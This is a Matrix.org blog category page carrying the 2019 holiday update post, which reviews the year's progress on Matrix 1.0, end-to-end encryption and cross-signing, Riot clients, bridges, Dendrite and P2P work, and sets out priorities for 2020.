<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="twitter:widgets:csp" content="on" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="twitter:site" content="@matrixdotorg" />
    <meta name="twitter:creator" content="@matrixdotorg" />

    <title>Matrix.org - General</title>
    <link rel="shortcut icon" href="/assets/favicon.ico" />
    <link rel="icon" type="image/png" href="/assets/favicon.png" />
    <link rel="stylesheet" href="/style.css" />

    
<link rel="alternate" type="application/rss+xml" title="RSS" href="/category/general/atom.xml">
</head>

<body>
    
    <header class="site-header">
    <a href="/" class="brand">
        <img src="/images/matrix-logo.svg" alt="Matrix logo">
    </a>
    <input id="site-header-dropdown-checkbox" type="checkbox" class="dropdown-checkbox" aria-hidden="true">
    <label for="site-header-dropdown-checkbox" class="dropdown-button">&#xe602;</label>
    <label for="site-header-dropdown-checkbox" class="page-overlay"></label>
    <nav>
        
        
        <a href="&#x2F;about&#x2F;" class="
            ">
            About
        </a>
        
        
        
        <a href="&#x2F;blog&#x2F;" class="
            ">
            Blog
        </a>
        
        
        
        
        
        <div class="section-wrap">
            <a href="&#x2F;docs&#x2F;" class="section ">
                Documentation
            </a>
            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                </div>
            </div>
        </div>
        
        
        
        
        
        <div class="section-wrap">
            <a href="&#x2F;ecosystem&#x2F;" class="section ">
                Ecosystem
            </a>
            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                    <a href="&#x2F;ecosystem&#x2F;clients&#x2F;">Clients</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;servers&#x2F;">Servers</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;bots&#x2F;">Bots</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;bridges&#x2F;">Bridges</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;sdks&#x2F;">SDKs</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;hosting&#x2F;">Hosting</a>
                    
                </div>
            </div>
        </div>
        
        
        
        <a href="&#x2F;podcasts&#x2F;" class="
            ">
            Podcasts
        </a>
        
        
        
        <a href="https:&#x2F;&#x2F;shop.matrix.org" class="
            ">
            Shop
        </a>
        
        
        
        <a href="&#x2F;try-matrix&#x2F;" class="primary
            ">
            Try Matrix
        </a>
        
        
    </nav>
</header>


    <main>
        
<div id="taxonomy-single">
    <div class="content">
        <header>
            <h1>General</h1>
            98 posts tagged with "General" <a href="/category">(See all Category)</a>
            
            <h2>
                <small><a href="/category/general/atom.xml">Atom Feed</a></small>
            </h2>
            
        </header>

        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;12&#x2F;24&#x2F;the-2019-matrix-holiday-update&#x2F;" title="The 2019 Matrix Holiday Update!">The 2019 Matrix Holiday Update!</a></h2>
                <span>
                    24.12.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Every year we do an annual wrap-up and retrospective of all the things happening in the Matrix core team - if you‚Äôre feeling particularly curious or bored you can check out the <a href="https://matrix.org/blog/2015/12/25/the-matrix-holiday-special/">2015</a>, <a href="https://matrix.org/blog/2016/12/26/the-matrix-holiday-special-2016-edition/">2016</a>, <a href="https://matrix.org/blog/2017/12/25/the-matrix-holiday-mini-special-2017-edition/">2017</a> and <a href="https://matrix.org/blog/2018/12/25/the-2018-matrix-holiday-special/">2018</a> editions for context.  The idea is to look at the bigger picture trends in Matrix outside of the weekly <a href="https://matrix.org/blog/category/this-week-in-matrix/">TWIM</a> posts to get an idea of the stuff which we made progress on, and the stuff which still remains.</p>
<p>That said, it‚Äôs hard to know where to start - Matrix accelerated more than ever before in 2019, and there‚Äôs been progress on pretty much all battlefronts.  So as a different format, let‚Äôs take the <a href="https://matrix.org/blog/2018/12/25/the-2018-matrix-holiday-special#2019">stuff we said we had planned for 2019</a> from the end of last year‚Äôs update and see what we actually achieved...</p>
<h4 id="2019-the-immediate-priorities">2019: the immediate priorities</h4>
<p>So, our immediate priorities for 2019 were:</p>
<ul>
<li><em>r0 spec releases across the board (aka Matrix 1.0)</em></li>
<li><em>Implementing them in Synapse</em></li>
</ul>
<p>‚úÖ Well, unless you‚Äôve been floating in a sensory deprivation tank for the last year, hopefully you spotted that Matrix (as a protocol) finally exited beta - starting off with the announcement at FOSDEM in February of the <a href="https://matrix.org/blog/2019/02/04/matrix-at-fosdem-2019/">first stable release of the Server-Server API</a>, alongside the Synapse 0.99.x series as we began the process of migrating to the 1.0 APIs.</p>
<p>Specifically this meant killing off self-signed certificates, adding .well-known server discovery and implementing room version semantics so we could upgrade the underlying room version algorithm to fix the residual flaws.  This culminated in June with the <a href="https://matrix.org/blog/2019/06/11/introducing-matrix-1-0-and-the-matrix-org-foundation/">official release of Matrix 1.0</a> - now including the remaining APIs and a stable release of Synapse 1.0.  The emphasis was on addressing all the main pre-1.0 design flaws rather than adding features or performance, but with 1.0 out the door at last we‚Äôve been able to make progress there too.</p>
<ul>
<li><em>Landing the Riot redesign</em></li>
</ul>
<p>‚úÖ The full redesign of Riot‚Äôs UI on Web/Desktop landed shortly after FOSDEM in Feb with <a href="https://medium.com/@RiotChat/the-big-1-0-68fa7c6050be">The Big 1.0</a>. Cosmetically we got most of the new look &amp; feel in place, and have had very positive feedback overall - although some of the UX thinkos of the old app remain and coming up on the radar for fixing.</p>
<ul>
<li><em>Finalising the Matrix.org Foundation</em> </li>
</ul>
<p>‚úÖ This happened too, coincident with releasing Matrix 1.0 in June - read all about it at <a href="https://matrix.org/foundation">https://matrix.org/foundation</a>. So far the governance and legal infrastructure the Foundation provides has helped the project significantly, and while it was a mammoth task to organise, we‚Äôre very glad it‚Äôs here!  Huge thanks go out to Jon, Ross and Jutta for agreeing to join the foundation as Guardians - they have been excellent in patiently listening to the various dramas of the year and ensuring Matrix‚Äôs neutrality and that we keep an even keel.</p>
<ul>
<li><em>Landing all the new E2E encryption UX and features</em></li>
</ul>
<p>The good news on E2E encryption is that we‚Äôve been making solid progress throughout the year - the bad news is that we are still yet to turn it on by default.  Progress updates for the various pieces of the puzzle are as follows:</p>
<ul>
<li>
<p>‚úÖ The final UX is pretty much locked down (after several iterations as we try to tread the balance between trustworthiness and security) - here‚Äôs a <a href="https://www.figma.com/file/wwqBo5oAFfk8XKmtd2YaIs/Cross-signing">sneak preview</a> of what we‚Äôre aiming at.</p>
</li>
<li>
<p>üèó Cross-signing is the single biggest remaining piece of work in progress - letting users attest to the trustworthiness of their own devices, so you only ever have to trust a given user once rather than trusting all their devices individually. We gave a <a href="https://youtu.be/C2eE7rCUKlE?t=2974">very early demo</a> of an experimental implementation back at FOSDEM in Feb, inspired by some of the initial spec proposal at <a href="https://github.com/uhoreg/matrix-doc/blob/cross-signing/proposals/1680-cross-signing.md">MSC1680</a> (MSC = Matrix Spec Change, our <a href="https://matrix.org/docs/spec/proposals">process for evolving Matrix</a>).<br/><br/>
However, having played with it a bit, MSC1680 turned out to be too generic and complicated (it worked by the user signing a device with any other of their devices, building a twisted maze of which device vouched for which) - and we replaced it with <a href="https://github.com/matrix-org/matrix-doc/pull/1756">MSC1756</a>, which shifts the model to be the simpler ‚Äúthe user has a key, which they use to sign their devices‚Äù. However, this in turn requires more infrastructure - you need somewhere secure to store your signing key, which prompted <a href="https://github.com/uhoreg/matrix-doc/blob/ssss/proposals/1946-secure_server-side_storage.md">MSC1946</a> - Secure Secret Storage &amp; Sharing (SSSS): the ability to sync your signing key between devices by storing it (encrypted, of course) on the server.<br/><br/>
Meanwhile, it also became obvious that the primitives for key verification needed to be improved too: introducing verification by emoji comparison (<a href="https://github.com/matrix-org/matrix-doc/issues/1267">MSC1267</a>) and QR codes (<a href="https://github.com/matrix-org/matrix-doc/issues/1543">MSC1543</a>), and switching key verification to be performed in the context of a DM (<a href="https://github.com/matrix-org/matrix-doc/pull/2241">MSC2241</a>) so that you can see your verification history, find verifications, and easily dip in and out of verifying users as needed.<br/><br/>
Whilst everyone else was panicking about Matrix 1.0 and associated baggage, Uhoreg was off in the wilderness plugging his way through all of this - iterating on the design, speccing it and implementing it in synapse and matrix-js-sdk, complete with a test jig to demonstrate it all working (<a href="https://scitech.video/videos/watch/1c8a0262-dee9-4927-b9e9-9856a7f4d8bf">part 1</a> and <a href="https://scitech.video/videos/watch/d1ef04a8-397a-4570-a9a9-cef143ea637c">part 2</a>).  Over the last few months the rest of the team has joined him though, and we‚Äôve been frantically working away implementing it all on both Riot/Web, iOS &amp; RiotX/Android.  For instance - here‚Äôs <a href="https://matrix.org/_matrix/media/r0/download/matrix.org/IoFfFRWTmRNTbNDzfmKFPvLq">verification happening in DM</a> between Riot/Web &amp; RiotX a few weeks ago, and here‚Äôs a very early (unskinned) cut of <a href="https://matrix.org/_matrix/media/r0/download/matrix.org/tAWxQKhrfiPxBvtAOQfMiGjW">verification</a> happening in Riot/Web‚Äôs RightPanel a few days ago.<br/><br/>
We were hoping to get cross-signing ready for the end of 2019, but in practice we‚Äôre now sprinting to get it done by FOSDEM 2020 in Feb - not least because we have a main-stage talk proposed to tell everyone how we landed it and turned on E2E by default... ;)</p>
</li>
<li>
<p>‚úÖ Support for non-E2E clients.  The last thing we want is to make it impossible to write a simple Matrix client, or to suddenly excommunicate (hah) all the existing Matrix bots &amp; bridges which haven‚Äôt implemented E2E.  To this end, poljar created <a href="https://github.com/matrix-org/pantalaimon">pantalaimon</a> - our very own Matrix daemon, which can sit in the background and offload all your E2EE from your Matrix client by acting as a transparent Matrix proxy which magically encrypts everything.  Built on matrix-nio and asyncio python3, We use it in production today for running various bots and it works excellently.</p>
</li>
<li>
<p>‚úÖ Support for search in E2E rooms.  Hot off the heels of pantalaimon‚Äôs success, poljar also created <a href="https://github.com/matrix-org/seshat">seshat</a> - a native library for clientside indexing encrypted Matrix events written in Rust, powered by the <a href="https://github.com/tantivy-search/tantivy">tantivy</a> full-text search engine.  (pantalaimon also has support for indexing via tantivy, which involved contributing python bindings for tantivy, but we ended up going with Rust so we could embed it natively in as many Matrix clients as possible).  Seshat is particularly cool in that the indexes themselves are encrypted in on disk - and in future could even be synced between clients using <a href="https://github.com/uhoreg/matrix-doc/blob/ssss/proposals/1946-secure_server-side_storage.md">SSSS</a> so you don‚Äôt have to reindex your messages every time you log in on a new device.  Seshat is implemented behind a labs flag on Riot/Desktop and it will ship as soon Riot/Desktop‚Äôs build pipeline is fully updated to support native modules (which will also unlock other goodies, such as using faster/safer native E2E primitives, safer key storage, and Discord-style keyboard-shortcuts for VoIP).</p>
</li>
<li>
<p>üèó Fixing ‚Äúunable to decrypt‚Äù errors.  We‚Äôve done big sprint over the last month or so to track down the final straggling causes of unable to decrypt errors.  Some of these are legitimate bugs (e.g. <a href="https://github.com/matrix-org/synapse/issues/6399">https://github.com/matrix-org/synapse/issues/6399</a>) - but many are artefacts of the current architecture: for instance, if the sender has no way to know your device was in the room when it encrypted a message, you won‚Äôt be able to decrypt.  We‚Äôre addressing this by improving better error messages and feedback so the user isn‚Äôt surprised by what‚Äôs going on (aiming for Jan) - and in future we‚Äôll have to revisit E2E‚Äôs fundamentals to ensure that it‚Äôs impossible to receive a message without also receiving the key to decrypt it.</p>
</li>
<li>
<p>‚úÖ Support for push notifications in E2E rooms.  This is kinda solved right now by having all clients get (silently) pushed whenever they receive a message in an E2E room with push enabled, and relying on the client to be woken up by the push in order to decrypt the message in order to display the push notification.  However, this is battery intensive, and we could probably do better - but this isn‚Äôt a blocker for going live.</p>
</li>
<li>
<p>üèó Support for FilePanel and NotifPanel in E2E rooms.  Seshat should fix this by indexing all your messages (and so tracking whether they contain pushes or files, and populating up your local view of your file &amp; notif panels respectively) - just need to ensure it‚Äôs hooked up.</p>
</li>
</ul>
<p>...and that‚Äôs where things stand right now on E2E by default.  We‚Äôll start turning it on by default for private rooms as soon as the UX has landed (probably starting first with new DMs and private rooms, prompting the user in case they want to opt out - and then migrating existing ones).  It‚Äôs worth noting that we have poured a <em>lot</em> of work into E2E encryption now - often to the detriment of the rest of Matrix; our rich featureset and decentralisation has combined to make this a tough nut to crack, but the end is in sight.  Thanks to all for your patience and support while we‚Äôve been working through this.</p>
<p>That takes us to the end of the stuff we planned to prioritise in 2019 - but what about the more speculative medium-term stuff which was on the menu this time last year?</p>
<h4 id="2019-the-medium-term-priorities">2019: the medium-term priorities</h4>
<ul>
<li><em>Reworking and improving Communities/Groups.</em></li>
</ul>
<p>We have some really promising UX work and a fairly early spec proposal (<a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1772/proposals/1772-groups-as-rooms.md">MSC1772</a>), but work in earnest hasn‚Äôt kicked off yet. It‚Äôs going to be one of the next big projects though. </p>
<ul>
<li><em>Reactions.</em></li>
</ul>
<p>‚úÖ Riot now has Reactions! üéâüéâüéâ  The only remaining work is to finish the remaining rough edges of the spec proposal (<a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1849/proposals/1849-aggregations.md">MSC1849</a>) and actually land them in the Matrix spec proper.</p>
<ul>
<li><em>E2E-encrypted Search</em></li>
</ul>
<p>‚úÖ <a href="https://github.com/matrix-org/seshat">Seshat</a> exists! (see above)</p>
<ul>
<li><em>Filtering. (empowering users to filter out rooms &amp; content they're not interested in).</em></li>
</ul>
<p>‚úÖ We‚Äôve ended up thinking lots in 2019 about empowering users to filter content.  The main impetus has been to ensure that users and communities can filter out abuse (on their own terms), and also to start building infrastructure which can be used for folks to share their own filters.  Over the last few months, this has started to take concrete form - with the arrival of <a href="https://github.com/matrix-org/matrix-doc/blob/msc2313/proposals/2313-moderation-policy-rooms.md">MSC2313</a> ‚ÄúModeration policies as rooms‚Äù, and <a href="https://github.com/matrix-org/mjolnir">Mjolnir</a> - a bot you can run to enforce moderation policies on your rooms.  It‚Äôs all quite early, but we expect a lot more work in this space over the coming year (and it‚Äôs wryly amusing that <a href="https://twitter.com/jack/status/1204766078468911106">Twitter has also woken up</a> to it being an interesting problem needing to be solved.)</p>
<ul>
<li><em>Extensible events</em> </li>
</ul>
<p>Sorry folks; no progress here since a flurry of spec work (<a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1767/proposals/1767-extensible-events.md">MSC1767</a>) back in Jan 2019. The good news is that the spec proposal seems to be relatively well received. The bad news is that we haven‚Äôt had bandwidth to finish reviewing it, implementing it and migrating it anywhere. It blocks a bunch of really useful stuff in Matrix, and there are users willing to pay for it (via New Vector) - we‚Äôll get to it as soon as we can.</p>
<ul>
<li><em>Editable messages.</em></li>
</ul>
<p>‚úÖ These landed too and are a thing of joy!  Just need to merge <a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1849/proposals/1849-aggregations.md">MSC1849</a>.</p>
<ul>
<li><em>Extensible Profiles (we've actually been experimenting with this already).</em></li>
</ul>
<p>Similar to Extensible Events, there was a flurry of spec work (<a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc1769/proposals/1769-extensible-profiles-as-rooms.md">MSC1769</a>) back in Jan, but little progress since.  This will also unlock a lot of really useful features - e.g. custom status, custom profile data, social timeline rooms etc.  We‚Äôll likely get to it shortly after communities work.</p>
<ul>
<li><em>Threading.</em></li>
</ul>
<p>üèó So we actually landed label-based threading (<a href="https://github.com/matrix-org/matrix-doc/blob/matthew/msc2326/proposals/2326-label-based-filtering.md">MSC2326</a>) in Synapse 1.6, but it‚Äôs not exposed in Riot yet (or elsewhere).  It doesn‚Äôt have quite the same semantics as Slack-style threading; the idea is to filter down your room based on which messages are tagged as part of a given topic.  However, it‚Äôs very powerful, and it‚Äôll be fun to add it to Riot at some point in 2020.  Meanwhile, better-than-label-based-threading is also on the cards, although slightly lower priority than some of the other stuff in this section.</p>
<ul>
<li><em>Landing the Riot/Android rewrite</em></li>
</ul>
<p>üèó As you probably know, RiotX is a full rewrite of Riot/Android in Kotlin using modern AndroidX and Jetpack idioms - and it entered beta <a href="https://medium.com/@RiotChat/introducing-the-riotx-beta-for-android-b17952e8f771">back in June</a>.  Since then we‚Äôve been frantically working away on both playing catch-up with the old app‚Ä¶ as well as implementing all the new stuff (reactions, edits, new E2E verification, cross-signing etc) which makes no sense to waste time adding in Riot/Android, but also pushes out the timeline on RiotX itself.</p>
<p>We‚Äôre currently sprinting to try to get RiotX ready for FOSDEM in February - hopefully users will have felt the app starting to really stabilise over the last few months (it even supports breadcrumbs now!)</p>
<ul>
<li><em>Considering whether to do a similar overhaul of Riot/iOS</em></li>
</ul>
<p>üèó It‚Äôs cheating a bit, but Manu (the lead developer on Riot/iOS and delivery manager of Riot/Mobile in general) has been hacking on an entirely new client called <a href="https://github.com/manuroe/messagerie">Messagerie</a> in his spare time, using SwiftUI.  The idea of throwing away the whole UI layer and replacing it with the latest best practices sounds suspiciously like RiotX - it‚Äôll be interesting to see how RiotX/iOS takes shape next year! </p>
<ul>
<li><em>Scaling synapse via sharding the master process</em></li>
</ul>
<p>We ended up bottlenecked on IO rather than CPU in 2019, and as a result we worked on splitting synapse‚Äôs database across multiple database instances on a per-table granularity.  However, the master process itself doesn‚Äôt shard yet; so we‚Äôre now bottlenecked on CPU and need to get on and do this asap to unlock further Synapse scalability for mega-monolithic-deployments like the Matrix.org homeserver. </p>
<ul>
<li><em>Bridge UI for discovery of users/rooms and bridge status</em> </li>
</ul>
<p>üèó There‚Äôs been a bit of movement in the last few weeks on this, but nothing concrete yet. </p>
<ul>
<li><em>Bandwidth-efficient transports</em> </li>
</ul>
<p>‚úÖ We finished the 100bps CoAP transport proof-of-concept for Matrix, demoed it at FOSDEM and <a href="https://matrix.org/blog/2019/03/12/breaking-the-100-bps-barrier-with-matrix-meshsim-coap-proxy">shipped it in March</a>. However, we haven‚Äôt progressed it much further; it really needs a corporate sponsor who wants to fund work to finish it off and bake it properly into Matrix. <strong>If you‚Äôre interested, please <a href="https://matrix.to/#/@matthew:matrix.org">get in touch</a>.</strong></p>
<ul>
<li><em>Bandwidth-efficient routing</em> </li>
</ul>
<p>üèó We also did a bunch of related work on bandwidth-efficient routing, which sadly hasn‚Äôt been released yet.  However, it‚Äôs interesting to note that the <a href="https://dsn.tm.kit.edu/english/">Decentralized Systems and Network Services Research Group</a> at Karlsruhe Institute of Technology‚Äôs Institute of Telematics has been looking into this space too - c.f. their <a href="https://publikationen.bibliothek.kit.edu/1000100364">A Glimpse of the Matrix</a> paper, which ponders very similar problems. </p>
<ul>
<li><em>Getting Dendrite to production.</em> </li>
</ul>
<p>üèó Dendrite work has been bubbling away in the background thanks to Anoa, Brendan, cnly (our GSoC dendrite contributor) and others.  Inevitably most of our bandwidth has gone into getting Synapse to 1.0 and making sure it‚Äôs fit for purpose, but we want and need to keep Dendrite alive for next-generation purposes - and in fact New Vector is hiring new people to work on it in 2020. </p>
<ul>
<li><em>Inline widgets (polls etc)</em></li>
</ul>
<p>üèó We have an MSC (<a href="https://github.com/matrix-org/matrix-doc/pull/2192">MSC2192</a>), but not an implementation. </p>
<ul>
<li><em>Improving VoIP over Matrix.</em> </li>
</ul>
<p>Very little progress here, frustratingly.  Jitsi has been upgraded and conference calls should kick ass these days (let us know if they don‚Äôt), but 1:1 needs a lot of love.  Hopefully we‚Äôll get to it in 2020. </p>
<ul>
<li><em>Adding more bridges, and improving the current ones.</em> </li>
</ul>
<p>Lots of bridging progress in 2020 - all new puppeting Slack support; huge fixes to the IRC bridge (including shifting to Postgres at last); Bifrost (the XMPP bridge) progressed too, and there‚Äôs been loads of community bridging work around WhatsApp, Discord and others. </p>
<ul>
<li><em>Account portability</em></li>
<li><em>Replacing MXIDs with public keys</em></li>
</ul>
<p>We‚Äôve just started looking at implementing these seriously via <a href="https://github.com/matrix-org/matrix-doc/blob/rav/proposal/remove_mxids_from_events/proposals/1228-removing-mxids-from-events.md">MSC1228</a> (as of last week) - expect progress in 2020.</p>
<p>So that sums up progress on the medium term menu - as you can see, a bunch actually happened; a bunch made progress; a few didn‚Äôt happen at all.</p>
<h4 id="2019-the-longer-term-priorities">2019: the longer-term priorities</h4>
<p>Finally, on the longer term radar:</p>
<ul>
<li><em>Shared-code cross-platform client SDKs (e.g. sharing a native core library between matrix-{js,ios,android}-sdk)</em> </li>
</ul>
<p>No progress here.  Instead, all three main platforms have continued to write and maintain their own platform-specific SDKs for now.  <a href="https://github.com/matrix-org/seshat">Seshat</a> however will be the first piece of native rust code shared across all 3 platforms - let‚Äôs see how that goes first... </p>
<ul>
<li><em>Matrix daemons (e.g. running an always-on client as a background process in your OS which apps can connect to via a lightweight CS API)</em></li>
</ul>
<p>‚úÖ <a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> lives!</p>
<ul>
<li><em>Push notifications via Matrix (using a daemon-style architecture)</em> </li>
</ul>
<p>No progress here, unless you count the CoAP low-bandwidth work.  However, Bubu (also Riot/Android Fdroid maintainer) has been working on a project called <a href="https://bubu1.eu/openpush/">OpenPush</a> which looks to help in this space (albeit not built on Matrix, but could be used by Matrix).  There are a few other related projects.  If someone wants to build this on top of Matrix + CoAP please get in touch asap! </p>
<ul>
<li><em>Clientside homeservers (i.e. p2p matrix) - e.g. compiling Dendrite to WASM and running it in a service worker.</em></li>
</ul>
<p>üèó Work is actually happening on this currently.  Dendrite has successfully compiled to WASM and runs, and we‚Äôve had it (almost) talking HTTP tunnelled over libp2p as part of P2P Matrix experiments.  In 2020 we‚Äôre going to be investing a lot in P2P Matrix - to give users full control of their communication without even having to run a server, and also to simplify onboarding and account portability enormously.  We have a talk about this accepted for FOSDEM 2020 (<a href="https://fosdem.org/2020/schedule/event/dip_p2p_matrix/">The Path to P2P Matrix</a>) and we‚Äôre actively (frantically) hacking on Dendrite to make it happen - keep an eye out for how things develop!</p>
<ul>
<li><em>Experimenting with MLS for E2E Encryption</em></li>
</ul>
<p>üèó Now that E2E-by-default has entered the ‚Äúit works! let‚Äôs land it in Riot asap‚Äù phase, Uhoreg has had some time to start thinking about the longer term future of encryption in Matrix.  <a href="https://datatracker.ietf.org/wg/mls/charter/">MLS (Messaging Layer Security)</a> is the IETF‚Äôs initiative to define a standard mechanism for end-to-end-encrypted group chats, which has some major algorithmic improvements over Olm/Megolm and the Double Ratchet Algorithm as used by Signal.  The catch is that it doesn‚Äôt work at all well with decentralisation - however, we‚Äôve been <a href="https://mailarchive.ietf.org/arch/msg/mls/MnLJkbJ_Mwe8Oz0Ll6delGJLPz4">working with them</a> to try to ensure MLS can work in a decentralised world.  More recently, uhoreg has had a chance to think a lot more about this and we‚Äôre working on a proposal for Decentralised MLS which builds on plain MLS while also giving the semantics needed for Matrix.  It‚Äôs all very experimental at this point (and the proof-of-concept implementation is written in <a href="https://julialang.org/">Julia</a>!) - but looks promising.  We‚Äôll share more asap, and will certainly be investing more time in this in 2020.. </p>
<ul>
<li><em>Storing and querying more generic data structures in Matrix (e.g. object trees; scene graphs)</em> </li>
</ul>
<p>Sadly no progress here :( </p>
<ul>
<li><em>Alternate use cases for VR, IoT, etc.</em> </li>
</ul>
<p>...and none here either.</p>
<p>So, of all the myriad things on our radar for 2019 (as of Dec 2018), hopefully this gives some idea of where we hit the mark.</p>
<h4 id="2019-the-unpredictable-bits">2019: the unpredictable bits</h4>
<p>However, there‚Äôs also a tonne of other stuff which happened which wasn‚Äôt explicitly on the radar.  On the synapse side, we finished fully migrating from Python 2 to Python 3, and started using asyncio and all the latest Python 3 goodies!  We finally <a href="https://github.com/matrix-org/synapse/pull/6358">implemented configurable history retention</a> for servers and rooms! We even implemented <a href="https://github.com/matrix-org/synapse/pull/6409">self-destructing messages</a> in Synapse (not that Riot exposes them yet). And there has been loads of optimisation and performance work since 1.0 landed in June.</p>
<p>On the ops side, we overhauled all our ops processes and security after the Matrix.org <a href="https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/">datacenter breach</a> in April, throwing away our legacy infrastructure and rebuilding it properly - and subsequently have been expanding our ops team from one dedicated ops person to four.  We also found ourselves having to do another emergency datacenter migration back in November when the old one was unable to reliably service IO for our database cluster. </p>
<p>We also spent a bunch time after shipping Matrix 1.0 working on tightening up Matrix‚Äôs privacy model - particularly around third party identity servers, integration managers, and making sure that folks self-hosting Matrix don‚Äôt accidentally depend on use 3rd party services without realising it.  If you missed out on the fun at the time, you can read all about it <a href="https://matrix.org/blog/2019/06/30/tightening-up-privacy-in-matrix/">here</a> and <a href="https://matrix.org/blog/2019/09/27/privacy-improvements-in-synapse-1-4-and-riot-1-4/">here</a>.  This ended up being way more work than we expected, but we‚Äôre very glad to have sorted it out now. </p>
<p>Meanwhile, mainstream uptake of Matrix has properly taken off, with the French Government launching Tchap (their fork of Riot), now with hundreds of thousands of daily active users.  The <a href="https://www.heise.de/newsticker/meldung/Open-Source-Bundeswehr-baut-eigene-verschluesselte-Messenger-App-4623404.html">German Government revealed today</a> that they are also formally trialling Matrix, starting with the Bundeswehr (Ministry of Defense); we‚Äôve been helping them out with the deployment too. It is not an exaggeration to suggest that we could end up with an official cross-government Matrix network, publicly federated with the wider Internet, for self-hosted encrypted decentralised instant messaging.  In fact Ulrich Kelber, the Bundesdatenschutzbeauftragte (Federal Data Protection Commissioner) for Germany <a href="https://www.golem.de/news/whatsapp-matrix-oder-xmpp-bmi-sucht-einen-messenger-fuer-bundesbehoerden-1912-145326.html">pointed out</a>: ‚ÄúYou could even set up a privacy-friendly messenger service in cooperation with France, which in the medium term could represent a real alternative to existing products on the market as a pan-European solution‚Äù. </p>
<p>Alongside all this, <a href="https://matrix.org/blog/2019/12/19/welcoming-mozilla-to-matrix/">Mozilla announced</a> they are replacing the Moznet IRC network with Matrix; <a href="https://matrix.org/blog/2019/02/20/welcome-to-matrix-kde/">KDE joined Matrix</a> in Feb, <a href="https://phabricator.wikimedia.org/T230531">Wikimedia</a> is getting set up on their server, and more and more massive players (including the largest in the world) keep getting in touch to find out how they can best get onboard Matrix - it‚Äôs incredibly exciting.  It also means that we were able to <a href="https://matrix.org/blog/2019/10/10/new-vector-raises-8-5-m-to-accelerate-matrix-riot-modular/">raise capital</a> to keep folks employed to work on Matrix fulltime via <a href="https://vector.im">New Vector</a> and scale up <a href="https://modular.im">Modular.im</a> as a paid hosting platform - which massively helps support core Matrix development.</p>
<h4 id="2020">2020</h4>
<p>All that remains now is to make some predictions for 2020.  Our main priorities are:</p>
<ul>
<li>
<p>Get E2E enabled for private rooms by default (see above). </p>
</li>
<li>
<p>Riot First-time User Experience (FTUE).  While we redesigned Riot‚Äôs UI in 2019, there are still far too many weird gotchas which trip over new users.  Starting in October we began a shift to completely change how Riot development works - transitioning the project to being led by the UX design team rather than the dev team, and ensuring that the design team considers the app holistically across all 3 platforms.  Above all else, our priority is to make it kick ass for normal non-technical mainstream users - not just for opensourcey wizards.  This is a tough ask, but we believe it‚Äôs literally make-or-break for the project in the long term if Matrix is ever to become as prevalent as Slack or WhatsApp, and we are throwing everything we have at it.  The second that E2E is on by default, the entirety of the Riot teams will be focusing on the mission to clear our <a href="https://github.com/vector-im/riot-web/issues?q=is%3Aopen+is%3Aissue+label%3Aproject%3Aftue">FTUE backlog</a>. </p>
</li>
<li>
<p>RiotX. We‚Äôre shipping RiotX on Android as fast as we can - currently users on Riot/Android are left high and dry and we need to do everything we can to finish RiotX and get them upgraded as rapidly as possible. </p>
</li>
<li>
<p>Communities.  Off the back of FTUE comes the importance of grouping rooms &amp; users together into communities in a much better way than we have today.  This will be up next. </p>
</li>
<li>
<p>Synapse: shard the master by user/room to avoid being it being bottlenecked on CPU.  We also need to apply smarter queue management on federation traffic to better reduce the memory footprint (and so eliminate complexity limits on small-footprint hosted servers!) - and we also desperately need to speed up joins. </p>
</li>
<li>
<p>Dendrite &amp; P2P Matrix: the plan currently is to use Dendrite as the basis for our P2P Matrix experiments.  In practice this means making it federate using <a href="https://github.com/matrix-org/matrix-doc/blob/rav/proposal/remove_mxids_from_events/proposals/1228-removing-mxids-from-events.md">MSC1228</a>-semantics (no point in wasting time implementing the ‚Äòlegacy‚Äô key management), and then experiment with hooking it up to various P2P transports (e.g. our low-bandwidth CoAP transport) and discovery systems (e.g. mDNS; libp2p; etc).  How we go about actually getting it into production depends entirely on how well the experiment goes; we could evolve Matrix to be hybrid CS/P2P; we could treat it as a new protocol and bridge to it; who knows.  Watch this space...</p>
</li>
<li>
<p>MLS: figure out our plan for next-generation E2E - for better scaling, and better reliability, and what (if anything) we should do with <a href="https://datatracker.ietf.org/wg/mls/charter/">MLS</a>. </p>
</li>
<li>
<p>Bridges: loads of work on the horizon to put a better UX on Bridging.  Bridge stability has improved enormously over the last year (thanks Half-Shot!) but we need to transition from being robust but ugly to being robust and polished... </p>
</li>
<li>
<p>Spec: we need to work out how to go faster on reviewing MSCs (both our own and from the wider community).  While the governance process in general feels healthier than it‚Äôs ever been, empirically we‚Äôre not exactly burning through the MSC backlog - and this is in part that MSC work is squeezed in alongside the other dayjob stuff everyone‚Äôs working on. Finding the right balance between sculpting spec and sculpting code is tough, but we‚Äôre going to try to improve it in 2020. </p>
</li>
<li>
<p>Abuse / Reputation: we want to empower users to make their own minds up about what content they want to see and not see on Matrix (or what they want to host or not host on their servers / communities / rooms).  <a href="https://github.com/matrix-org/mjolnir">Mjolnir</a> is a good start, but we‚Äôll be continuing to work on this throughout the year.</p>
</li>
</ul>
<p>Meanwhile, all the things listed above that we didn‚Äôt get to in 2019 are of course still options on the menu too.</p>
